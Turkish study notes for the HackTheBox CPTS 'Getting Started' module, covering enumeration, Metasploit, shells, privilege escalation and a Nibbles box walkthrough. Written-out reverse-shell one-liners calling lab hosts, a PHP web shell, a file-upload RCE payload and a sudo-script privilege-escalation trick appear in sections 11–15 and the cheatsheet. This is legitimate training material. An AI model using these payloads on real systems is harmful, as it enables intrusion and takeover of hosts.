[← Tüm modüller](../README.md)

# 02 — Getting Started

HTB CPTS path'inin ikinci modülü için tuttuğum çalışma notları. Pentest'e sıfırdan başlangıç: infosec temelleri ve CIA triad, pentest distro + organizasyon + VPN, sık kullanılan terim/teknolojiler (shell, port, web server, OWASP Top 10), temel araçlar (SSH, Netcat, Tmux, Vim), service scanning (Nmap/FTP/SMB/SNMP), web enumeration, public exploit bulma + Metasploit, shell türleri (reverse/bind/web + TTY upgrade), privilege escalation primer, file transfer; kapanışta ilk box **Nibbles**'ın uçtan uca çözümü.

Bu modül **01 — Penetration Testing Process**'in pratik karşılığı: oradaki 8 aşamalı süreç haritasının her kutusunun gerçek komutlarla nasıl işlediği. Seviyem itibarıyla içerik büyük ölçüde tanıdık — notun değeri **komut refleksini pekiştirmek ve cheatsheet üretmek**te, o yüzden tabloları komut-odaklı tuttum.

Notlar Türkçe yazıldı, teknik terimler bilinçli olarak İngilizce bırakıldı — saha dili bu şekilde ve terimleri çevirmek aramayı zorlaştırıyor.

---

## İçindekiler

**Bölüm I — Temeller & Ortam**
1. [Infosec & CIA Triad](#1-infosec--cia-triad)
2. [Red / Blue Team & Pentester Rolü](#2-red--blue-team--pentester-rolü)
3. [Pentest Distro & Organizasyon](#3-pentest-distro--organizasyon)
4. [VPN ile Bağlanma](#4-vpn-ile-bağlanma)

**Bölüm II — Terimler & Araçlar**

5. [Common Terms — Shell / Port / Web Server / OWASP Top 10](#5-common-terms)
6. [Basic Tools — SSH / Netcat / Tmux / Vim](#6-basic-tools)

**Bölüm III — Enumeration**

7. [Service Scanning — Nmap](#7-service-scanning--nmap)
8. [Service'lere Saldırı — FTP / SMB / SNMP](#8-servicelere-saldırı--ftp--smb--snmp)
9. [Web Enumeration](#9-web-enumeration)

**Bölüm IV — Exploitation & Sonrası**

10. [Public Exploits & Metasploit](#10-public-exploits--metasploit)
11. [Shell Türleri + TTY Upgrade](#11-shell-türleri--tty-upgrade)
12. [Privilege Escalation Primer](#12-privilege-escalation-primer)
13. [File Transfer](#13-file-transfer)

**Bölüm V — Pratik**

14. [Common Pitfalls](#14-common-pitfalls)
15. [Case Study: Nibbles (uçtan uca)](#15-case-study-nibbles-uçtan-uca)
16. [Tek Bakışta Cheatsheet](#16-tek-bakışta-cheatsheet)

---

# Bölüm I — Temeller & Ortam

## 1. Infosec & CIA Triad

**Information security (infosec):** veriyi yetkisiz erişim, değişiklik, hukuksuz kullanım ve kesintiye karşı koruma; olay etkisini azaltma.

**CIA Triad** — infosec'in çekirdeği:
```
Confidentiality  →  veriye sadece yetkilinin erişmesi
Integrity        →  verinin değiştirilmemesi / bütünlüğü
Availability      →  verinin gerektiğinde erişilebilir olması
```

**Risk Management Process — 5 adım** (01 modülündeki risk stratejilerinin süreç hali):

| Adım | Ne yapılır |
|---|---|
| **Identify** | Maruz kalınan riskleri belirle (legal, çevresel, piyasa, regülasyon) |
| **Analyze** | Etki + olasılık; policy/prosedür/süreçlere eşle |
| **Evaluate** | Sırala, önceliklendir; accept / avoid / control / transfer kararı |
| **Dealing** | Stakeholder ile riski elimine/kontrol et |
| **Monitoring** | Sürekli izle — impact skoru değişebilir (low → high) |

---

## 2. Red / Blue Team & Pentester Rolü

| | Red Team | Blue Team |
|---|---|---|
| Rol | Saldırgan | Savunan |
| Görev | Pentest, social engineering, offensive teknikler | Risk analizi, policy, incident response, security tools |
| İş hacmi | Azınlık | **İnfosec işlerinin çoğunluğu** |

**Pentester = security assessor:** iç/dış ağda risk tespit eder, nasıl tekrarlanacağını gösterir, mitigation/remediation rehberliği verir. Zafiyeti doğru derecelendirmek için **risk management'ı derinlemesine anlamak şart**.

> Not: `01 — Penetration Testing Process` modülündeki black/grey/white box ve external/internal ayrımları burada da geçerli — tekrar için [Case Study](#15-case-study-nibbles-uçtan-uca) kısmındaki tabloya bak.

---

## 3. Pentest Distro & Organizasyon

**Distro:** Debian/Ubuntu tabanlı, araç yüklü (ParrotOS = HTB Pwnbox'ın temeli). Hiçbir distro **her** aracı içermez; zamanla kendi "must-have" listeni kurarsın.

> **Altın kural:** Her assessment **taze (fresh) VM** ile yapılır — başka müşterinin verisini yanlışlıkla rapora taşımamak + sensitive data'yı uzun süre tutmamak için. Hızlı VM kurulumu için automation/script/prosedür hazır olmalı.

**Kurulum seçenekleri:** base OS (önerilmez) · dual boot (yavaş geçiş) · **virtualization** (önerilen — VirtualBox, VMware, Hyper-V, Proxmox/ESXi).

**Hypervisor:** host üzerinde izole VM çalıştırır → production ağ ile HTB/client ortamı arasında koruma katmanı (VM breakout nadir de olsa mümkün).

**İmaj formatları:**

| Format | Ne | Ne zaman |
|---|---|---|
| **ISO** | CD-ROM imajı, OS'u kendin kurarsın | Daha fazla özelleştirme (keyboard, locale, partition) |
| **OVA** | Hazır appliance (OVF XML + VMDK) | Hızlı deploy |

### Organizasyon — Folder Structure
```
Projects/
└── Acme Company/
    ├── EPT/                    # External Penetration Test
    │   ├── evidence/
    │   │   ├── credentials/
    │   │   ├── data/
    │   │   └── screenshots/
    │   ├── logs/  scans/  scope/  tools/
    └── IPT/                    # Internal Penetration Test
        └── (aynı yapı)
```

**Note-taking araçları:** Cherrytree, VS Code, Obsidian/Notion, GitBook, Sublime, Notepad++, CherryTree. **Markdown öğren** — görsel ve düzenli. Client verisi **sadece local**, cloud'a sync etme.

**Knowledge base kur:** her payload/komut/ipucunu biriktir; checklist + report template + findings DB (title/description/impact/remediation/references) → reporting süresini ciddi kısaltır.

---

## 4. VPN ile Bağlanma

```bash
sudo openvpn user.ovpn
# ... "Initialization Sequence Completed"  ← başarı işareti
```

**Doğrulama komutları:**
```bash
ip -4 a show tun0        # tun0 IP geldiyse bağlısın
netstat -rn              # routing table — erişilebilen ağlar
ping -c 4 10.10.14.1     # gateway'e ping
```
HTB Academy makineleri `10.129.0.0/16` ağında, `tun0` üzerinden `10.10.14.0/23`'le erişilir.

> **Güvenlik:** HTB ağını her zaman **"hostile"** say. Sadece VM'den bağlan, SSH password auth kapat, web server kilitle, **client assessment VM'iyle HTB oynama**.

VPN servisi (NordVPN vb.) ≠ anonimlik garantisi; firewall/kısıtlama atlatmak ya da düşman ağda (public WiFi) işe yarar, suç sonuçlarından korumaz. HTB VPN **tek cihazda** aktif olur.

---

# Bölüm II — Terimler & Araçlar

## 5. Common Terms

### Shell
Kullanıcıdan komut alıp OS'a ileten program (Linux: **Bash** = geliştirilmiş `sh`; alternatifler Zsh/Fish/Ksh). "Shell almak" = hedefi exploit edip komut çalıştırabilir hale gelmek.

| Shell türü | İletişim |
|---|---|
| **Reverse shell** | Hedef bize bağlanır (listener'a) |
| **Bind shell** | Hedef bir portta dinler, biz ona bağlanırız |
| **Web shell** | HTTP parametresiyle komut, output web sayfasında |

→ Detaylı: [Bölüm 11](#11-shell-türleri--tty-upgrade)

### Port
Ağ bağlantısının başlayıp bittiği sanal nokta; her biri bir servise bağlı. **65,535 TCP + 65,535 UDP**. Well-known: 0–1023.

| Protokol | TCP | UDP |
|---|---|---|
| Connection | Connection-oriented (handshake var, güvenilir) | Connectionless (handshake yok, hızlı, güvenilmez) |
| Ne zaman | Veri bütünlüğü önemliyse | Time-sensitive (streaming, VoIP) |

**Ezberlenecek portlar** (refleks olmalı):
```
20/21 FTP   22 SSH    23 Telnet   25 SMTP    80 HTTP
161 SNMP    389 LDAP  443 HTTPS   445 SMB    3389 RDP   88 Kerberos
```

### Web Server
Back-end'de HTTP trafiğini yöneten uygulama (port 80/443). Web app'ler internete açık → geniş attack surface, yüksek değerli hedef.

### OWASP Top 10 (2021)

| # | Kategori | Kısaca |
|---|---|---|
| 1 | **Broken Access Control** | Yetki kısıtı düzgün uygulanmamış |
| 2 | **Cryptographic Failures** | Kripto hatası → sensitive data exposure |
| 3 | **Injection** | Doğrulanmamış input (SQLi, command inj., LDAP) |
| 4 | **Insecure Design** | Tasarımda güvenlik yok |
| 5 | **Security Misconfiguration** | Eksik hardening, default config, verbose error |
| 6 | **Vulnerable & Outdated Components** | Güncel olmayan/desteksiz bileşen |
| 7 | **Identification & Authentication Failures** | Kimlik/oturum yönetimi saldırıları |
| 8 | **Software & Data Integrity Failures** | Güvenilmez kaynaktan plugin/lib/CDN |
| 9 | **Security Logging & Monitoring Failures** | Log/monitoring yok → breach görülmez |
| 10 | **SSRF** | Doğrulanmamış URL ile sunucuya istek yaptırma |

---

## 6. Basic Tools

Pentest aracı değiller ama **her gün** kullanılır — ustalaşmak şart.

### SSH (port 22)
Güvenli remote erişim; password veya key-based. Cleartext cred / private key bulursan doğrudan bağlan. Reverse shell'den **çok daha stabil**; jump host + port forwarding için ideal.
```bash
ssh Bob@10.10.10.10
ssh root@10.10.10.10 -i id_rsa    # key ile (önce chmod 600 id_rsa)
```

### Netcat (`nc`)
TCP/UDP portlarıyla etkileşim. Shell bağlantısı + **banner grabbing** + file transfer.
```bash
nc -nv 10.10.10.10 22     # banner grab → SSH-2.0-OpenSSH_8.4p1 ...
nc -lvnp 1234             # listener (reverse shell için)
```
Benzerleri: **socat** (port forward + TTY upgrade için daha güçlü), PowerCat (Windows/PowerShell).

### Tmux (terminal multiplexer)
Prefix: **`Ctrl+B`**
```
Ctrl+B  C          yeni window
Ctrl+B  0/1        window'a geç
Ctrl+B  Shift+%    dikey pane böl
Ctrl+B  Shift+"    yatay pane böl
Ctrl+B  ok tuşları pane'ler arası geçiş
```
Logging için kritik (engagement'ta kayıt tutma).

### Vim
```
i            insert mode    Esc   normal mode'a dön
x / dw / dd  cut char/word/line
yw / yy      copy word/line     p   paste
:w  :q  :q!  :wq              kaydet / çık / kaydetmeden çık / kaydet+çık
:1           satır 1'e git
```
İpucu: komut önüne sayı → tekrar (`4yw` = 4 kelime kopyala). Compromised Linux'larda sık bulunur → remote dosya düzenlemek için öğren.

---

# Bölüm III — Enumeration

## 7. Service Scanning — Nmap

**Service:** başka kullanıcı/bilgisayar için iş yapan uygulama; bir porta bağlı. İlgilendiğimiz: **misconfigured veya vulnerable** olanlar.

```bash
nmap 10.129.42.253                       # default: top 1000 TCP port
nmap -sV -sC -p- 10.129.42.253           # version + default script + TÜM 65535 port
nmap -A -p445 10.129.42.253              # agresif (OS + version + script + traceroute)
nmap --script smb-os-discovery.nse -p445 <ip>   # belirli script
```

| Flag | Anlamı |
|---|---|
| `-sV` | Version detection (servis protokol/isim/versiyon) |
| `-sC` | Default script scan (NSE) |
| `-p-` | Tüm 65,535 TCP port |
| `-A` | Agresif: OS + version + script + traceroute |
| `--open` | Sadece açık portlar |
| `-oA <ad>` | 3 formatta kaydet (.nmap/.gnmap/.xml) |

**Port state'leri:** `open` · `filtered` (firewall belirli adreslerden izin veriyor) · `closed`.

> **OS ipucu:** 3389 açık → Windows; 22 açık → genelde Linux/Unix (ama Windows'ta da olabilir). Version → OS versiyonu (örn. OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 → Focal Fossa 20.04). Cross-referencing %100 güvenilir değil (eski OS'a yeni paket kurulabilir).

NSE script dizini: `/usr/share/nmap/scripts/` · syntax: `nmap --script <ad> -p<port> <host>`.

---

## 8. Service'lere Saldırı — FTP / SMB / SNMP

### Banner Grabbing
```bash
nc -nv 10.129.42.253 21                        # manuel → 220 (vsFTPd 3.0.3)
nmap -sV --script=banner -p21 <ip>             # otomatik
```

### FTP (21)
`ftp-anon` script'i **anonymous login** açık mı gösterir.
```bash
ftp -p 10.129.42.253
# Name: anonymous → 230 Login successful
ls / cd pub / get login.txt / exit
```
Standart komutlar (`cd`, `ls`, `get`) çalışır. İçinde cred bulunabilir.

### SMB (445)
Windows'ta yaygın; vertical + lateral movement vektörü. Share'lerde cred; eski versiyonlarda **EternalBlue (MS17-010)** gibi RCE.
```bash
nmap --script smb-os-discovery.nse -p445 <ip>  # OS/hostname/workgroup
smbclient -N -L \\\\10.129.42.253\\            # share listesi (-N: no password)
smbclient -U bob \\\\10.129.42.253\\users       # cred ile bağlan
# içeride: ls / cd / get passwords.txt
```

### SNMP (161 UDP)
Community string'lerle cihaz bilgisi. Default `public`/`private` sık değişmez. v1/v2c **plaintext** community string; encryption/auth sadece **v3**'te. Command-line'daki cred'ler, routing bilgisi sızabilir.
```bash
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0   # hostname
onesixtyone -c dict.txt 10.129.42.254                       # community string brute
```

---

## 9. Web Enumeration

Port 80/443 → web server → yüksek değerli hedef. Özellikle başka servis az/patch'liyse kritik.

### Directory / File Brute-Force (Gobuster / ffuf)
```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
| HTTP kodu | Anlamı |
|---|---|
| 200 | OK — doğrudan erişilebilir |
| 301 | Redirect (başarısızlık değil) |
| 403 | Forbidden — erişim yasak (ama var) |

### DNS Subdomain Enumeration
```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
# → blog. / customer. / my. / ns1. ...
```
Admin panelleri, ek fonksiyonlu app'ler subdomain'lerde olabilir.

### Web Enumeration İpuçları

| Teknik | Komut / Yer | Ne verir |
|---|---|---|
| **Server header** | `curl -IL https://site` | Framework, auth, misconfig |
| **Whatweb** | `whatweb 10.10.10.121` | Server/framework/app + versiyon |
| **EyeWitness** | — | Screenshot + fingerprint + default cred |
| **Certificate** | HTTPS cert incele | Email, şirket adı (phishing için) |
| **robots.txt** | `/robots.txt` | Gizli dosya/admin sayfa konumları |
| **Source code** | `Ctrl+U` | Developer comment, gömülü cred |

---

# Bölüm IV — Exploitation & Sonrası

## 10. Public Exploits & Metasploit

Enumeration'da servis/versiyon bulunca → **public exploit ara**.

### searchsploit (Exploit-DB offline)
```bash
sudo apt install exploitdb -y
searchsploit openssh 7.2
```
Online: Exploit-DB, Rapid7 DB, Vulnerability Lab, Google ("app adı + exploit").

### Metasploit Framework (MSF)
Hazır exploit + recon/verification script + **Meterpreter** + post-exploitation/pivoting.

```
msfconsole                                  # başlat
search exploit eternalblue                  # ara (filtre: cve:2009 type:exploit)
use exploit/windows/smb/ms17_010_psexec     # seç
show options                                # Required=yes olanları doldur
set RHOSTS 10.10.10.40                       # hedef
set LHOST tun0                               # kendi IP/interface
check                                        # (destekliyorsa) zafiyet teyidi
exploit    (veya run)                        # çalıştır → meterpreter session
```
Meterpreter içinde: `getuid`, `shell`.

> **Uyarı:** Metasploit'e tamamen güvenme. Well-rounded tester tüm araçları bilir, neden başarısız olduklarını anlar, gerektiğinde manuel tekniğe geçer. Pratik için retired boxlar: Granny/Grandpa, Jerry, Blue, Lame, Optimum, Legacy, Devel.

---

## 11. Shell Türleri + TTY Upgrade

### Reverse Shell (en yaygın, en hızlı)
Hedef **bize** bağlanır. Önce listener:
```bash
nc -lvnp 1234     # -l dinle, -v verbose, -n no DNS, -p port
```
Kendi IP'ni bul (`ip a` → HTB'de `tun0`), sonra hedefte reverse shell komutu çalıştır:
```bash
# Linux
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
# Windows (PowerShell one-liner) — PayloadsAllTheThings'te tam liste
```
**Kırılgan:** komut durursa / bağlantı koparsa, exploit'i tekrar çalıştırman gerekir.

### Bind Shell
Hedef bir portta **dinler**, biz bağlanırız. Kopunca tekrar bağlanabilirsin (ama komut durur/reboot olursa yine exploit gerekir).
```bash
# hedefte dinlet: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
nc 10.10.10.1 1234     # bize bağlan
```

### Web Shell
Web dizinine (webroot) script koy, HTTP parametresiyle komut çalıştır.
```php
<?php system($_REQUEST["cmd"]); ?>     // PHP
```
| Web Server | Default Webroot |
|---|---|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
curl http://SERVER_IP/shell.php?cmd=id
```
**Avantaj:** firewall'ı atlar (80/443 üzerinden), reboot'ta kalıcı. **Dezavantaj:** interaktif değil.

### TTY Upgrade (netcat shell → tam interaktif)
```bash
python -c 'import pty; pty.spawn("/bin/bash")'   # yoksa python3
# Ctrl+Z  (background)
stty raw -echo ; fg
# [Enter] [Enter]
export TERM=xterm-256color
stty rows 67 columns 318          # kendi terminalinde: echo $TERM ; stty size
```
Bunsuz: ok tuşları, komut geçmişi, `su`/text editor çalışmaz.

---

## 12. Privilege Escalation Primer

İlk erişim genelde **low-priv user**. Hedef: root (Linux) / Administrator-SYSTEM (Windows).

**Checklist kaynakları:** HackTricks, PayloadsAllTheThings.
**Enum script'leri:** LinEnum, linuxprivchecker, Seatbelt, JAWS, **PEASS (LinPEAS/WinPEAS)**.

> **Uyarı:** Bu script'ler çok "noise" üretir → AV/monitoring tetikleyebilir. Bazen **manuel** enum tercih edilir.

**Başlıca vektörler:**

| Vektör | Nasıl bakılır | Not |
|---|---|---|
| **Kernel exploit** | Eski OS versiyonu → searchsploit (örn. DirtyCow / CVE-2016-5195) | System instability riski — prod'da dikkat |
| **Vulnerable software** | `dpkg -l` (Linux) / `C:\Program Files` (Win) | Eski versiyon → public exploit |
| **Sudo** | `sudo -l` | `(ALL:ALL) ALL` → `sudo su -`. NOPASSWD varsa parolasız |
| **GTFOBins** | sudo çalıştırılabilen app'i exploit et | Win karşılığı: LOLBAS |
| **SUID / Token** | SUID binary / Windows token privileges | — |
| **Scheduled tasks / cron** | `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root` | Yazılabilir dizin/script → reverse shell |
| **Exposed credentials** | config / log / `.bash_history` / PSReadLine | **Password reuse** çok yaygın — DB parolası = user parolası? |
| **SSH keys** | `/home/user/.ssh/id_rsa` okunabiliyorsa | `chmod 600` sonra `ssh -i`; yazılabiliyorsa `authorized_keys`'e public key ekle |

```bash
sudo -l                                   # sudo hakları
sudo su -                                 # (ALL:ALL) ALL ise root
sudo -u user /bin/echo hi                 # belirli user olarak çalıştır
# cron/writable file → append reverse shell (ÖNCE backup al, ÜZERİNE YAZMA)
```

---

## 13. File Transfer

Reverse shell'de (Meterpreter'ın `upload`'ı yoksa) dosya aktarımı.

### HTTP server (wget / curl)
```bash
# attack box (dosyanın olduğu dizinde):
python3 -m http.server 8000
# hedefte:
wget http://10.10.14.1:8000/linenum.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

### SCP (SSH cred varsa)
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

### Base64 (firewall download'u engelliyorsa)
```bash
base64 shell -w 0          # attack box: encode et, çıktıyı kopyala
echo <base64str> | base64 -d > shell    # hedef: decode et
```

### Doğrulama
```bash
file shell                 # format doğru mu (ELF vb.)
md5sum shell               # iki tarafta aynı hash → transfer sağlam
```

---

# Bölüm V — Pratik

## 14. Common Pitfalls

| Sorun | Çözüm |
|---|---|
| VPN bağlı mı? | `Initialization Sequence Completed` · `ip -4 a show tun0` · `netstat -rn` · gateway ping |
| İki cihazdan bağlanma | HTB VPN **tek cihaz** — ikincisi başarısız olur |
| Lag/latency | En yakın region server'ı seç (EU/US/AU/SG) |
| **Burp proxy açık kaldı** | Sayfa yüklenmiyorsa → FoxyProxy "Turn Off" / browser proxy kapat |
| SSH key sorunu | `ssh-keygen` ile yenile |

---

## 15. Case Study: Nibbles (uçtan uca)

Easy-rated Linux box. **İlk box** — 8 aşamalı sürecin gerçek işleyişi. Attack vector: web (Nibbleblog file upload) → priv-esc: sudoers misconfig + world-writable file.

### Box Bilgisi
| | |
|---|---|
| OS / Zorluk | Linux / Easy |
| User path | Web (Nibbleblog 4.0.3 authenticated file upload) |
| Priv-esc | World-writable file + sudoers NOPASSWD |

**Box rengi hatırlatma:** Nibbles **grey-box** yaklaşılıyor (IP + OS biliniyor). HTB active makineler **black-box**.

| Engagement | Bilgi | Simüle ettiği |
|---|---|---|
| Black-box | Sıfır/minimum (sadece isim/IP) | Gerçek saldırı; en az kapsamlı |
| Grey-box | Kısmi (IP range, low-priv cred, diyagram) | Malicious insider / düşük erişimli saldırgan |
| White-box | Tam (admin cred, source code) | En kapsamlı analiz |

### 1) Enumeration — Nmap
```bash
nmap -sV --open -oA nibbles_initial_scan 10.129.42.190     # → 22 SSH, 80 Apache
nmap -p- --open -oA nibbles_full_tcp_scan <ip>             # tüm portlar (ek yok)
nmap -sC -p 22,80 -oA nibbles_script_scan <ip>             # default script
nmap -sV --script=http-enum -oA ... <ip>                   # web dizin enum
```
Sonuç: Ubuntu, port 22 (OpenSSH 7.2p2) + 80 (Apache). **`-oA` ile tüm formatları kaydet; detaylı + timestamp'li not tut** — outage/incident'ta client aktiviteni sorabilir.

### 2) Web Footprinting
```bash
whatweb 10.129.42.190                      # Apache 2.4.18
curl http://10.129.42.190                  # HTML comment: <!-- /nibbleblog/ ... -->
whatweb http://10.129.42.190/nibbleblog    # → Nibbleblog (PHP blog engine)
gobuster dir -u .../nibbleblog/ -w .../common.txt   # admin.php, content/, README ...
curl .../nibbleblog/README                 # → Version: v4.0.3  (vulnerable!)
```
**Enumeration zinciri (iteratif):**
1. `users.xml` → username **admin** doğrulandı + IP blacklist (brute force = out)
2. `config.xml` → site title & email'de **nibbles** geçiyor (= box adı)
3. Tahmin: admin parolası = **nibbles** ✓

> **Ders:** Önündeki her bilgiyi değerlendir. CeWL ile siteyi tarayıp wordlist üretmek klasik teknik. Thorough + iterative enumeration = başarının anahtarı.

### 3) Initial Foothold — Authenticated File Upload
Admin panelde **Plugins → My image** PHP yüklemeye izin veriyor (image yerine):
```php
<?php system('id'); ?>     // test
```
Yüklenen yer: `/nibbleblog/content/private/plugins/my_image/image.php`
```bash
curl .../my_image/image.php                # uid=1001(nibbler) → RCE!
```
Sonra reverse shell'e çevir:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
```bash
nc -lvnp 9443                              # listener → shell as nibbler
python3 -c 'import pty; pty.spawn("/bin/bash")'   # TTY upgrade (python yok, python3 var)
# /home/nibbler → user.txt + personal.zip
```

### 4) Privilege Escalation
```bash
unzip personal.zip        # → personal/stuff/monitor.sh (nibbler sahipli, YAZILABİLİR)
# LinEnum.sh indir/çalıştır:
sudo -l
# → (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Writable + sudo NOPASSWD kombinasyonu → monitor.sh **sonuna** reverse shell ekle:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
# listener: nc -lvnp 8443 → uid=0(root) → root.txt
```
> **Kritik:** Writable dosyayı exploit ederken **önce backup al, ÜZERİNE YAZMA, sadece sonuna append et** — disruption önlemek için.

### 5) Alternate Method — Metasploit
```
search nibbleblog
use exploit/multi/http/nibbleblog_file_upload
set rhosts 10.129.42.190 ; set lhost 10.10.14.2
set username admin ; set password nibbles ; set targeturi nibbleblog
set payload generic/shell_reverse_tcp
exploit     # → shell as nibbler (priv-esc aynı)
```
Aynı sonuca iki yoldan ulaşmak = araç çeşitliliği refleksi.

---

## 16. Tek Bakışta Cheatsheet

| Aşama | Komut / Araç |
|---|---|
| **VPN** | `sudo openvpn user.ovpn` → `ip -4 a show tun0` |
| **Port scan** | `nmap -sV -sC -p- -oA scan <ip>` |
| **Banner grab** | `nc -nv <ip> <port>` |
| **FTP** | `ftp -p <ip>` → anonymous → `get` |
| **SMB** | `smbclient -N -L \\\\<ip>\\` → `smbclient -U user \\\\<ip>\\share` |
| **SNMP** | `snmpwalk -v 2c -c public <ip>` · `onesixtyone -c dict.txt <ip>` |
| **Web dir** | `gobuster dir -u http://<ip>/ -w common.txt` |
| **Web fingerprint** | `whatweb <ip>` · `curl -IL <url>` · robots.txt · `Ctrl+U` |
| **Exploit ara** | `searchsploit <app> <ver>` · `msfconsole` → `search` |
| **Reverse listener** | `nc -lvnp 1234` |
| **Reverse shell (Linux)** | `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'` |
| **Web shell (PHP)** | `<?php system($_REQUEST["cmd"]); ?>` |
| **TTY upgrade** | `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `stty raw -echo;fg` |
| **PrivEsc enum** | `sudo -l` · LinPEAS · HackTricks checklist |
| **File transfer** | `python3 -m http.server 8000` → `wget http://<ip>:8000/file` |
| **Doğrulama** | `file <f>` · `md5sum <f>` (iki tarafta eşit) |

---

## Kaynaklar

Notlar aşağıdaki kaynaklardan derlendi:

- **HTB Academy** — Getting Started (CPTS path, Module 02)
- **Nibbles** box — mrb3n (creator); 0xdf & Ippsec walkthrough'ları
- **OWASP** — Top 10 (2021)
- **Nmap** — resmi dokümantasyon ve NSE script'leri
- **PayloadsAllTheThings / HackTricks / GTFOBins / LOLBAS** — exploit & priv-esc referansları
- **SecLists** — wordlist'ler · **PEASS** (LinPEAS/WinPEAS) — enum script'leri

Notlar kişisel çalışma amacıyla tutuldu ve halka açık paylaşıldı.
Hata veya eksik gördüğünüz yerler için issue açabilirsiniz.

[← Tüm modüller](../README.md)
